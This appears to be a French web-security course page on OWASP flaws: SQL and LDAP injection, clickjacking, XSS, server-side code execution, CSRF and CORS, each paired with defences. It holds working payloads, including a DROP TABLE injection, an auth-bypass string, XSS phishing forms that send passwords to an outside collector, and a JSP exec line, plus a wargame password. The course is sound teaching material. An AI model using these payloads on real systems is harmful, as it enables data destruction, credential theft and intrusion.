Failblesses d&rsquo;authentification<ul><li>Possibilité de brute force</li><li>Mots de passe faibles ou trop standards</li><li>Déconnexions et invalidation de session mal gérés</li></ul></li><li>A8 : Non controles d&rsquo;intégrité<ul><li>Données entrantes (au run)</li><li>Bibliothèques vérolées (au build)</li></ul></li></ul><hr><ul><li>A9 : Défaut de tracabilité<ul><li>Logs inexploitables</li><li>Impossible de savoir clairement qui a fait quoi et quand</li></ul></li><li>A10 : Injection de code &ldquo;côté serveur&rdquo;, vision réseau<ul><li>Sécurité en profondeur, cloisonnement réseau</li><li>Comptes applicatif à droits limités</li></ul></li></ul><hr><h3 id=les-vulnérabilités-concrètement->Les vulnérabilités concrètement ! <a href=#les-vuln%c3%a9rabilit%c3%a9s-concr%c3%a8tement- class=anchor aria-hidden=true>#</a></h3><hr><hr><h3 id=linjection-de-code>L&rsquo;injection de code <a href=#linjection-de-code class=anchor aria-hidden=true>#</a></h3><p>Que s&rsquo;est-il passé ?</p><blockquote><h4 id=école-municipale-de-kelkepare>École municipale de Kelkepare <a href=#%c3%a9cole-municipale-de-kelkepare class=anchor aria-hidden=true>#</a></h4><p><strong>Inscription d&rsquo;un nouvel élève</strong></p><p>Prénom : <input id=scriptEvil0 type=text> <button onclick=injection()>Inscrire l&rsquo;élève</button></p><ul id=myUl0></ul></blockquote><hr><h3 id=linjection-de-code-1>L&rsquo;injection de code <a href=#linjection-de-code-1 class=anchor aria-hidden=true>#</a></h3><p>Que s&rsquo;est-il passé ?</p><pre><code class=language-java>public void inscrireEleve(String prenom){
  String maRequeteSQL = &quot;INSERT INTO Students VALUES ('&quot; + prenom + &quot;')&quot;;
  connectionSql.createStatement().executeQuery(maRequeteSQL);
}
</code></pre><hr><h3 id=linjection-de-code-2>L&rsquo;injection de code <a href=#linjection-de-code-2 class=anchor aria-hidden=true>#</a></h3><p>Que s&rsquo;est-il passé ?</p><ul><li>Si on remplit dans le formulaire <code>Robert'); DROP TABLE Students;--</code></li><li>La requète envoyée au serveur devient :</li></ul><pre><code>INSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')
</code></pre><hr><h3 id=linjection-de-code-côté-serveur--sql-ou-ldap>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP <a href=#linjection-de-code-c%c3%b4t%c3%a9-serveur--sql-ou-ldap class=anchor aria-hidden=true>#</a></h3><p>Pourquoi ?</p><ul><li>Consulter des données confidentielles</li><li>Altérer la base de données</li></ul><hr><h3 id=linjection-de-code--côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo; <a href=#linjection-de-code--c%c3%b4t%c3%a9-serveur class=anchor aria-hidden=true>#</a></h3><h4 id=exemple-en-sql>Exemple en SQL <a href=#exemple-en-sql class=anchor aria-hidden=true>#</a></h4><pre><code class=language-java>&quot;SELECT * FROM USER WHERE identifiant='&quot; + username + &quot;' AND password='&quot; + password + &quot;'&quot;;
</code></pre><p>à renseigner avec username=<code>robichu</code> et password=<code>' OR '1'='1' --</code> pour se connecter en tant que M Robichu</p><hr><h3 id=linjection-de-code--côté-serveur-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo; <a href=#linjection-de-code--c%c3%b4t%c3%a9-serveur-1 class=anchor aria-hidden=true>#</a></h3><h4 id=exemple-en-ldap>Exemple en LDAP <a href=#exemple-en-ldap class=anchor aria-hidden=true>#</a></h4><pre><code class=language-java>&quot;(&amp;(uid = &quot; + user_name + &quot;) (userpassword = &quot; + user_password + &quot;))&quot;;
</code></pre><p>à renseigner avec username=<code>robichu)(&)</code> pour se connecter en tant que M Robichu</p><hr><h3 id=linjection-de-code-côté-serveur--sql-ou-ldap-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP <a href=#linjection-de-code-c%c3%b4t%c3%a9-serveur--sql-ou-ldap-1 class=anchor aria-hidden=true>#</a></h3><p>Sécurité :</p><ul><li>Échapper les caractères spéciaux</li><li>=> Utiliser des PreparedStatement</li><li>=> Utiliser des Frameworks qui font le boulot (hibernate, &mldr;)</li><li><strong>Et que l&rsquo;on garde à jour bien entendu</strong></li></ul><hr><h1 id=vous-avez-gagné>Vous avez Gagné <a href=#vous-avez-gagn%c3%a9 class=anchor aria-hidden=true>#</a></h1><p><button>Cliquez la</button></p><iframe id=t title=t width=1500 height=1000 style=opacity:.00000000001;position:relative;top:-5em;left:-10em src=http://localhost:8180/admin/master/console/#/realms/test/clients></iframe><hr><h1 id=vous-avez-gagné-1>Vous avez Gagné <a href=#vous-avez-gagn%c3%a9-1 class=anchor aria-hidden=true>#</a></h1><p><button>Cliquez la</button></p><iframe id=t title=t width=1500 height=1000 style=opacity:.3;position:relative;top:-5em;left:-10em src=http://localhost:8180/admin/master/console/#/realms/test/clients></iframe><hr><hr><h1 id=les-attaques-basées-sur-des-croisements-de-domaines>Les attaques basées sur des croisements de domaines <a href=#les-attaques-bas%c3%a9es-sur-des-croisements-de-domaines class=anchor aria-hidden=true>#</a></h1><hr><ul><li>Un utilisateur connecté sur un site légitime envoie des données à un site attaquant</li><li>Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime</li></ul><hr><h3 id=les-iframe>Les <code>&lt;iframe></code> <a href=#les-iframe class=anchor aria-hidden=true>#</a></h3><ul><li>Principe légitime à la base : afficher une page web sur une autre page web</li><li>Comportements détournés</li><li>Clickjacking = on cache une iframe par dessus un bouton aparemment légitime</li></ul><pre><code class=language-html>&lt;iframe style=&quot;opacity: 0&quot; src=&quot;https://le-site-des-admins&quot;&gt;
</code></pre><hr><h3 id=xfs>XFS <a href=#xfs class=anchor aria-hidden=true>#</a></h3><ul><li>XFS ou Cross Frame Scripting : principe général d&rsquo;attaque consistant à injecter le site légitime sur le site du pirate via un iframe</li></ul><hr><ul><li>Protection<ul><li><strong>Déclarative</strong> uniquement = on va dire au navigateur que le site n&rsquo;a aucune raison légitime d&rsquo;être dans une iframe</li><li>Des entêtes standards existent :</li></ul><pre><code>X-Frame-Options:&lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/&gt;;
</code></pre><ul><li>On filtre donc les origines qui ont le droit d&rsquo;afficher l&rsquo;iframe</li><li>/!\ Absence d&rsquo;entête = autorisé de n&rsquo;importe quel source</li></ul></li></ul><hr><h3 id=linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client ! <a href=#linjection-de-code-c%c3%b4t%c3%a9-client- class=anchor aria-hidden=true>#</a></h3><blockquote><h4 id=école-municipale-de-kelkepare-1>École municipale de Kelkepare <a href=#%c3%a9cole-municipale-de-kelkepare-1 class=anchor aria-hidden=true>#</a></h4><p><strong>Inscription d&rsquo;un nouvel élève</strong></p><p>Prénom : <input id=scriptEvil type=text> <button onclick=fonction()>Inscrire l&rsquo;élève</button></p><ul id=myUl></ul></blockquote><hr><h3 id=linjection-de-code-côté-client--1>L&rsquo;injection de code&mldr; côté client ! <a href=#linjection-de-code-c%c3%b4t%c3%a9-client--1 class=anchor aria-hidden=true>#</a></h3><p>Et si j&rsquo;écrit dans le formulaire :</p><pre><code>&lt;form action=&quot;https://securite-applicative.free.beeceptor.com&quot; &gt;Entrez votre mot de passe : &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;button type=&quot;submit&quot; formtarget=&quot;_blank&quot;&gt;Me connecter&lt;/button&gt;&lt;/form&gt;
</code></pre><p>Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative</p><hr><h3 id=linjection-de-code-côté-client--2>L&rsquo;injection de code&mldr; côté client ! <a href=#linjection-de-code-c%c3%b4t%c3%a9-client--2 class=anchor aria-hidden=true>#</a></h3><p>Déclinable à souhait&mldr;</p><pre><code>&lt;button onclick=&quot;window.location='https://securite-applicative.free.beeceptor.com'&quot; &gt;Continuer&lt;/button&gt;
</code></pre><hr><h3 id=linjection-de-code-côté-client>L&rsquo;injection de code &ldquo;côté client&rdquo; <a href=#linjection-de-code-c%c3%b4t%c3%a9-client class=anchor aria-hidden=true>#</a></h3><p>On peut forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action</p><ul><li>En le redirigeant sur la page avec des paramètres de requete trafiqués</li><li>En stockant en base un code qui va être réaffiché</li></ul><hr><h3 id=linjection-de-code-côté-client-1>L&rsquo;injection de code &ldquo;côté client&rdquo; <a href=#linjection-de-code-c%c3%b4t%c3%a9-client-1 class=anchor aria-hidden=true>#</a></h3><ul><li>On peut ainsi rajouter ce genre de code sur la page de l&rsquo;utilisateur</li></ul><pre><code class=language-html>&lt;script&gt;document.location=&quot;https://no.domain&quot;&lt;/script&gt;
</code></pre><pre><code class=language-html>&lt;script&gt;
document.getElementsByTagName(&quot;body&quot;)[0].innerHTML(&quot;
&lt;form action='https://no.domain' &gt;
&lt;br&gt;Connectez vous !&lt;br&gt;
&lt;input type='text' name='email'&gt;
&lt;input type='password' name='mot de passe'&gt;
&lt;input type='submit' value='Connexion'&gt;
&lt;/form&gt;
&quot;)
&lt;/script&gt;
</code></pre><hr><h2 id=linjection-de-code-côté-client--xss-cross-site-scripting>L&rsquo;injection de code &ldquo;côté client&rdquo; : XSS (Cross-Site Scripting) <a href=#linjection-de-code-c%c3%b4t%c3%a9-client--xss-cross-site-scripting class=anchor aria-hidden=true>#</a></h2><hr><h3 id=pourquoi->Pourquoi ? <a href=#pourquoi- class=anchor aria-hidden=true>#</a></h3><ul><li>Vol de données, en particulier des cookies de session (<a href=/securite-applicative/digressions.html#/la-session-http>explications</a>)</li><li>Redirection malveillante</li></ul><hr><h3 id=comment->Comment ? <a href=#comment- class=anchor aria-hidden=true>#</a></h3><ul><li>Consiste à injecter du code et en particulier des script dans une page web (<strong>donc éxécuté par l&rsquo;utilisateur dans son navigateur</strong>)</li><li>L&rsquo;attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code</li><li>L&rsquo;attaquant peut aussi profiter d&rsquo;une non validation des données persistantes (BDD)</li></ul><hr><h3 id=types-de-xss>Types de XSS <a href=#types-de-xss class=anchor aria-hidden=true>#</a></h3><ul><li>Injection &ldquo;en direct&rdquo; par le serveur, on parle de reflected XSS</li><li>On l&rsquo;appelle DOM XSS, si elle consiste à modifier le DOM via un script</li><li>Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n&rsquo;a même plus besoin de fournir un lien trafiqué à l&rsquo;utilisateur.</li></ul><hr><h2 id=sécurité->Sécurité : <a href=#s%c3%a9curit%c3%a9- class=anchor aria-hidden=true>#</a></h2><ul><li>Vérifier les entrées utilisateurs !</li><li>Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple <code>${fn:escapeXml(string)}</code> dans une EL en JSP)</li></ul><hr><h2 id=sécurité-déclarative->Sécurité déclarative : <a href=#s%c3%a9curit%c3%a9-d%c3%a9clarative- class=anchor aria-hidden=true>#</a></h2><ul><li><a href=https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html>Résumé des headers</a></li><li>Content Security Policy (CSP) <a href=https://developer.mozilla.org/fr/docs/Web/HTTP/CSP>Prez</a> <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy>Spec</a></li><li>(deprecated) <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection>X-XSS-Protection</a></li></ul><hr><h2 id=compléments-pour-la-protection-des-cookies>Compléments pour la protection des cookies <a href=#compl%c3%a9ments-pour-la-protection-des-cookies class=anchor aria-hidden=true>#</a></h2><ul><li>Forcer les cookies à être &ldquo;secure&rdquo; (utilisable en https uniquement), &ldquo;httpOnly&rdquo; (non utilisable dans les scripts)</li><li>Précision : il s&rsquo;agit de sécurité <strong>déclarative</strong> dont la mise en oeuvre est à la charge du navigateur</li></ul><hr><h1 id=un-peu-plus-de-pratique->Un peu plus de pratique ?? <a href=#un-peu-plus-de-pratique- class=anchor aria-hidden=true>#</a></h1><hr><h3 id=avant-de-continuer>Avant de continuer&mldr; <a href=#avant-de-continuer class=anchor aria-hidden=true>#</a></h3><p>Découvrons une série challenge disponible sur internet</p><ul><li><a href=http://natas0.natas.labs.overthewire.org>Natas 0</a> (mot de passe de natas0 : <code>natas0</code>)</li><li>Sur les premiers niveaux, on voit qu&rsquo;une resource cachée n&rsquo;est jamais cachée (<a href=/securite-applicative/digressions.html#/le-fichier-robots-txt target=_blank>Digression : robots.txt</a>) et que quelques éléments pouvent être très facilement manipulés dans la requête</li></ul><hr><h3 id=linjection-de-code--le-retour-de-la-revanche>L&rsquo;injection de code : le retour de la revanche <a href=#linjection-de-code--le-retour-de-la-revanche class=anchor aria-hidden=true>#</a></h3><p>Quelques niveaux plus tard :</p><ul><li><a href=http://natas12.natas.labs.overthewire.org>Natas 12</a> (mot de passe de natas12 : <code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code>)</li><li>Le but est de découvrir le mot de passe de natas13 situé dans /etc/natas_webpass/natas13</li><li>Hint : passthru est une fonction php permettant d&rsquo;éxécuter sur le sytème du code arbitraire</li></ul><hr><h3 id=linjection-de-code--le-retour-de-la-revanche-1>L&rsquo;injection de code : le retour de la revanche <a href=#linjection-de-code--le-retour-de-la-revanche-1 class=anchor aria-hidden=true>#</a></h3><p>Exécution de code sur le serveur</p><ul><li>Mettre un fichier malicieux sur le serveur permettant l&rsquo;éxécution de code à distance.</li><li>Ici le code injecté sera du code <strong>éxécuté côté serveur</strong> (java sur jsp, php)</li></ul><hr><h3 id=linjection-de-code-côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo; <a href=#linjection-de-code-c%c3%b4t%c3%a9-serveur class=anchor aria-hidden=true>#</a></h3><ul><li>Exécution de code sur le serveur au plus près du système</li><li>Rebond sur le SI possible si :<ul><li>flux larges entre les différents serveurs</li><li>compte éxécutant le code à haut privilège</li></ul></li></ul><hr><ul><li>Nombreuses possibilités : aussi bien des traitements dans l&rsquo;application non prévus que des opérations directement sur le système d&rsquo;exploitation</li><li>Par exemple réussir à placer sur le serveur une jsp contenant :</li></ul><pre><code class=language-jsp>&lt;%Runtime.getRuntime().exec(&quot;less /confidentiel/data&quot;);%&gt;
</code></pre><ul><li>Un langage de programmation lance indirectement des commandes système</li></ul><hr><h2 id=sécurité--1>Sécurité : <a href=#s%c3%a9curit%c3%a9--1 class=anchor aria-hidden=true>#</a></h2><ul><li>Contrôler les entrées utilisateurs et en particulier pour les <strong>fichiers</strong> :<ul><li>le type MIME des entrées, la cohérence type attendu et contenu autant que possible</li><li>l&rsquo;extention de fichier nommé car le serveur et/ou le navigateur peut interpréter différemment un fichier selon son nommage</li></ul></li></ul><hr><h2 id=sécurité--2>Sécurité : <a href=#s%c3%a9curit%c3%a9--2 class=anchor aria-hidden=true>#</a></h2><ul><li>Côté prod :<ul><li>&ldquo;chroot&rdquo; des applications ou machines limité à un traitement</li><li>utilisateur éxécutant l&rsquo;application avec droit limités (ce n&rsquo;est pas le compte root/admin qui démarre le tomcat)</li><li>flux limités entre machines</li></ul></li></ul><hr><h3 id=linjection-de-code--synthèse>L&rsquo;injection de code : Synthèse <a href=#linjection-de-code--synth%c3%a8se class=anchor aria-hidden=true>#</a></h3><ul><li>Un sujet central : l&rsquo;entrée untilisateur</li><li>Mais qu&rsquo;est ce qu&rsquo;une entrée utilisateur ?</li></ul><hr><h3 id=linjection-de-code-3>L&rsquo;injection de code <a href=#linjection-de-code-3 class=anchor aria-hidden=true>#</a></h3><p>Qu&rsquo;est ce qu&rsquo;une entrée utilisateur ?</p><ul><li>Requête et Paramètres de requête</li><li>Corps de requête (contenu des requête POST et PUT) : réponse à un formulaire, fichier</li><li>Cookies</li><li><a href=https://developer.mozilla.org/fr/docs/Web/HTTP/Headers>Entetes HTTP</a> (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, &mldr;)</li></ul><hr><h3 id=linjection-de-code-4>L&rsquo;injection de code <a href=#linjection-de-code-4 class=anchor aria-hidden=true>#</a></h3><p>Controle des chaines entrées et échappement de tous les caratères interprétables en html, en sql,&mldr; selon la situation.</p><p>Un développeur web peut se contenter de surveiller ces entrées mais en réalité, les failles peuvent survenir sur n&rsquo;importe quel bit d&rsquo;un échange réseau.</p><hr><h3 id=les-attaques-basées-sur-des-échanges-entre-domaines--encore-une->Les attaques basées sur des échanges entre domaines : encore une !! <a href=#les-attaques-bas%c3%a9es-sur-des-%c3%a9changes-entre-domaines--encore-une- class=anchor aria-hidden=true>#</a></h3><p>CSRF (Cross-Site Request Forgery)</p><ul><li>scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l&rsquo;action s&rsquo;effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.</li></ul><hr><h3 id=démo-csrf>Démo CSRF <a href=#d%c3%a9mo-csrf class=anchor aria-hidden=true>#</a></h3><p>https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection</p><p>Un admin regarde vraiment ses messages de temps en temps !</p><hr><h3 id=protections>Protections <a href=#protections class=anchor aria-hidden=true>#</a></h3><p>Problématique :</p><ul><li>On ne cherche pas à empécher une acton malveillante en soi</li><li>On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s&rsquo;assurer que l&rsquo;utilisateur réalise son opération en pleine conscience.</li></ul><hr><h3 id=protections-1>Protections <a href=#protections-1 class=anchor aria-hidden=true>#</a></h3><ul><li>Vérifier les entrées utilisateurs ?</li><li>Ici, l&rsquo;action à bloquer est légitime&mldr;</li></ul><hr><h3 id=protections-2>Protections <a href=#protections-2 class=anchor aria-hidden=true>#</a></h3><ul><li>Faire en sorte qu&rsquo;à chaque appel d&rsquo;un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s&rsquo;assurer de la cohérence de la requête</li><li>Des bibliothèques peuvent aider à cette protection : Spring security, pac4j</li></ul><hr><h3 id=protections-3>Protections <a href=#protections-3 class=anchor aria-hidden=true>#</a></h3><ul><li>Il faut alors ajouter dans chaque formulaire le jeton en hidden</li></ul><pre><code class=language-html>&lt;form action=&quot;/monActionAdmin&quot;
  method=&quot;post&quot;&gt;
  &lt;input type=&quot;submit&quot;
    value=&quot;Faire l'opération sensible&quot; /&gt;
  &lt;input type=&quot;hidden&quot;
    name=&quot;${_csrf.parameterName}&quot;
    value=&quot;${_csrf.token}&quot;/&gt;
&lt;/form&gt;
</code></pre><hr><h3 id=protections-4>Protections <a href=#protections-4 class=anchor aria-hidden=true>#</a></h3><ul><li>Principe tout POST ne contenant pas ce paramètre se soldera par une 403</li><li>Potentiellement pas nécessaire sur tout le site</li><li>Pour lever la protection en spring security:</li></ul><pre><code class=language-java>http.csrf().ignoringAntMatchers(&quot;/saml/**&quot;); // l'ignorer sur certaines url
http.csrf().disable(); // l'ignorer complètement
</code></pre><hr><h3 id=csrf-et-applis-modernes>CSRF et applis &ldquo;modernes&rdquo; <a href=#csrf-et-applis-modernes class=anchor aria-hidden=true>#</a></h3><p>Frontend JS + Backend Java</p><ul><li>Pas de formulaire côté serveur</li><li>Des requêtes isolée, pas de cookie mais authentification par jeton</li><li>Si je sers &ldquo;presque&rdquo; le même service javascript, si l&rsquo;admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite</li><li>Protection = vérifier l&rsquo;url où l&rsquo;admin a récupéré le script</li></ul><hr><h3 id=la-protection-cors>La protection CORS <a href=#la-protection-cors class=anchor aria-hidden=true>#</a></h3><p>Cross Over Resource Sharing</p><p>Scénario d&rsquo;attaque :</p><ul><li>J&rsquo;arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d&rsquo;Internet. L&rsquo;information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate.</li></ul><hr><p>Contre-attaque :</p><ul><li>Seul le navigateur sait le site réel où il a récupéré le site</li><li>Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS</li><li>=> La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source</li></ul><p><em>Le site dit : voici l&rsquo;url des sites qui peuvent m&rsquo;appeler</em></p><hr><p>Les navigateurs envoient systématiquement et automatiquement l&rsquo;entête <code>Origin</code> (à moins d&rsquo;utiliser Netscape 8 ou IE 6)</p><p><strong>Le navigateur n&rsquo;autorise pas la modification de cet entete par script</strong></p><hr><h3 id=la-protection-cors-1>La protection CORS <a href=#la-protection-cors-1 class=anchor aria-hidden=true>#</a></h3><ul><li>Pour les requêtes GET et POST &ldquo;simple&rdquo;, supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s&rsquo;affiche qu&rsquo;en cas de validation de CORS</li><li>Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n&rsquo;exécute la requête qu&rsquo;en cas de validation</li><li>!!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes</li></ul><hr><h3 id=la-protection-cors-2>La protection CORS <a href=#la-protection-cors-2 class=anchor aria-hidden=true>#</a></h3><ul><li>C&rsquo;est donc le serveur qui a la charge de lire l&rsquo;entête <code>Origin</code>, de répondre ou non selon le contenu</li><li>Le serveur DOIT ajouter l&rsquo;entete <code>Access-Control-Allow-Origin</code> en cas de succès</li><li>Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script</li><li>On peut envisager de renvoyer <code>Access-Control-Allow-Origin: *</code> si le site ne fournit que des données publiques non sensibles</li></ul><hr><h3 id=la-protection-cors-3>La protection CORS <a href=#la-protection-cors-3 class=anchor aria-hidden=true>#</a></h3><p>Domaine au sens CORS :</p><ul><li>Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).</li><li>http://localhost:8080 n&rsquo;est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent</li></ul><hr><h3 id=scénario-cors>Scénario CORS <a href=#sc%c3%a9nario-cors class=anchor aria-hidden=true>#</a></h3><ul><li>Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().</li><li>Le navigateur ajoute l&rsquo;entete Origin à la requête</li><li>Cet entête n&rsquo;est pas modifiable par script</li></ul><pre><code>Origin: https://localhost:8443
</code></pre><hr><h3 id=scénario-cors-1>Scénario CORS <a href=#sc%c3%a9nario-cors-1 class=anchor aria-hidden=true>#</a></h3><ul><li>Le serveur recoit la requete et peut contrôler la présence de Origin s&rsquo;il s&rsquo;attend à de telles requêtes via script</li><li>Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (*)</li></ul><hr><h3 id=scénario-cors-2>Scénario CORS <a href=#sc%c3%a9nario-cors-2 class=anchor aria-hidden=true>#</a></h3><ul><li>Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés</li><li>Si le serveur choisit de répondre et qu&rsquo;il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :</li></ul><pre><code>Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
</code></pre><ul><li>S&rsquo;il accepte n&rsquo;importe quel requête issue d&rsquo;un script :</li></ul><pre><code>Access-Control-Allow-Origin: *
</code></pre><hr><h3 id=scénario-cors-3>Scénario CORS <a href=#sc%c3%a9nario-cors-3 class=anchor aria-hidden=true>#</a></h3><ul><li>Le navigateur lit la réponse du serveur</li><li>Si elle ne contient pas d&rsquo;entête Access-Control-Allow-Origin ou qu&rsquo;aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. <em>Le script ne fait pas la difference entre un echec de connexion et une erreur cors</em></li></ul><hr><p>Gestion des erreurs :</p><ul><li>Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée</li></ul><p>Test :
<button onclick=testCors()>Test CORS KO</button></p><hr><h3 id=la-protection-cors-4>La protection CORS <a href=#la-protection-cors-4 class=anchor aria-hidden=true>#</a></h3><ul><li>Attention à l&rsquo;autorisation globale (elle peut parfois être nécessaire cependant) : <code>Access-Control-Allow-Origin: *</code></li><li>L&rsquo;idéal est de controler côté serveur l&rsquo;entete &ldquo;Origin&rdquo; et de personnaliser l&rsquo;entete &ldquo;Access-Control-Allow-Origin&rdquo; si on accepte</li><li>Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS</li></ul><hr><h3 id=la-protection-cors-5>La protection CORS <a href=#la-protection-cors-5 class=anchor aria-hidden=true>#</a></h3><ul><li>Il faut garder à l&rsquo;esprit que CORS est une sécurité <em>côté client</em> pour l&rsquo;empécher de faire n&rsquo;importe quoi malgré lui : fournir à un script une information que le serveur n&rsquo;a pas prévu d&rsquo;être utilisée par un script.</li></ul><hr><h3 id=synthèse>Synthèse <a href=#synth%c3%a8se class=anchor aria-hidden=true>#</a></h3><p>Deux grands types de protection</p><ul><li>Vérifier les entrées utilisateurs ! (Sécurité active)</li><li>Vérifier que l&rsquo;utilisateur est bien conscient de ses actions :<ul><li>Vérification d&rsquo;état (Sécurité active)</li><li>Dire au navigateur quelles opérations sont légitimes ou non (Sécurité déclarative)</li></ul></li></ul><hr><h3 id=sinitier-aux-failles-applicatives>S&rsquo;initier aux failles applicatives <a href=#sinitier-aux-failles-applicatives class=anchor aria-hidden=true>#</a></h3><ul><li><a href=https://www.owasp.org>OWASP</a><ul><li>Documentation et notamment le OWASP top 10</li><li>WebGoat (découverte de failles sous forme de cours)</li><li>Juice Store (challenges)</li></ul></li><li><a href=https://overthewire.org/wargames/natas/>Natas</a></li><li><a href=https://www.root-me.org/>Root Me</a></li></ul><p>Par ailleurs le <a href=https://www.cert.ssi.gouv.fr/>CERT-FR</a> est un sytème de notification des failles applicatives. Il publie aussi régulièrement des articles de cybersécurité.</p><hr><h3 id=surveiller-les-dépendances-obsolètes>Surveiller les dépendances obsolètes <a href=#surveiller-les-d%c3%a9pendances-obsol%c3%a8tes class=anchor aria-hidden=true>#</a></h3><ul><li>Dependabot (vérification existance d&rsquo;une nouvelle version)</li><li>Pour vérifier vulnérabilités connues : https://owasp.org/www-project-dependency-check/</li></ul><hr><h3 id=le-code-des-autres>&ldquo;Le code des autres&rdquo; <a href=#le-code-des-autres class=anchor aria-hidden=true>#</a></h3><ul><li>Log4Shell <em>Decembre 2021</em></li><li>https://fr.wikipedia.org/wiki/Log4Shell</li><li>Voir projet exploit</li><li>Exploiter avec https://canarytokens.org/generate</li></ul><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="docs-navigation d-flex justify-content-between"><a href=/docs/intro/grands-principes/><div class="card my-1"><div class="card-body py-2">&larr; Les grands principes de la sécurité</div></div></a><a class=ms-auto href=/docs/failles/sql/><div class="card my-1"><div class="card-body py-2">Injections de code (serveur) &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Powered by Github-pages, <a class=text-muted href=https://gohugo.io/>Hugo</a>, and <a class=text-muted href=https://getdoks.org/>Doks</a></li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=/js/bootstrap.min.f93d87ed312fd94eae9a720e5988a3bd322bcdd099518866fc5668e18610cca0077fc356b3edfc727dedf5f773dab0a6d87a870e4b616595e76381163dd5a730.js integrity="sha512-+T2H7TEv2U6umnIOWYijvTIrzdCZUYhm/FZo4YYQzKAHf8NWs+38cn3t9fdz2rCm2HqHDkthZZXnY4EWPdWnMA==" crossorigin=anonymous defer></script>
<script src=/js/highlight.min.537e57b5cd767e9b03563e3c2d8db2bb71516fb92afdadec7dbadb99c3a2710479044278bfeaa670bf89dd37224ed7e73d319d5e7819b6293907ddabd61bfd77.js integrity="sha512-U35Xtc12fpsDVj48LY2yu3FRb7kq/a3sfbrbmcOicQR5BEJ4v+qmcL+J3TciTtfnPTGdXngZtik5B92r1hv9dw==" crossorigin=anonymous defer></script>
<script src=/js/vendor/katex/dist/katex.min.93253b59f879e8b8bf4ef8eec49737249299a1cc8b9c25eb1b0c94ae722f3bc470677d56dfdfcc838ccc904ee3ebcc46a5336495f3b1d7fdbb182f3e6b952390.js integrity="sha512-kyU7Wfh56Li/TvjuxJc3JJKZocyLnCXrGwyUrnIvO8RwZ31W39/Mg4zMkE7j68xGpTNklfOx1/27GC8+a5UjkA==" crossorigin=anonymous defer></script>
<script src=/js/vendor/katex/dist/contrib/auto-render.min.b688a23169501c711300d4bdb5ae40c52ee8976f722fbf3871eb709a51db2ea5d7bf51eaef0e82af7542d973d2f681d9c46b70b72d902601642a15af9b9ce80d.js integrity="sha512-toiiMWlQHHETANS9ta5AxS7ol29yL784cetwmlHbLqXXv1Hq7w6Cr3VC2XPS9oHZxGtwty2QJgFkKhWvm5zoDQ==" crossorigin=anonymous defer></script>
<script src=/main.min.b8e7e565bd2186f67f57d2c5d9680f67abbb2a977ff20ad27eb51f5a7b9071fdec7b71a5e964a41a38fb59cb12d43b76e0b3ac8247cb7063bb73efc06a9ac529.js integrity="sha512-uOflZb0hhvZ/V9LF2WgPZ6u7Kpd/8grSfrUfWnuQcf3se3Gl6WSkGjj7WcsS1Dt24LOsgkfLcGO7c+/AaprFKQ==" crossorigin=anonymous defer></script>
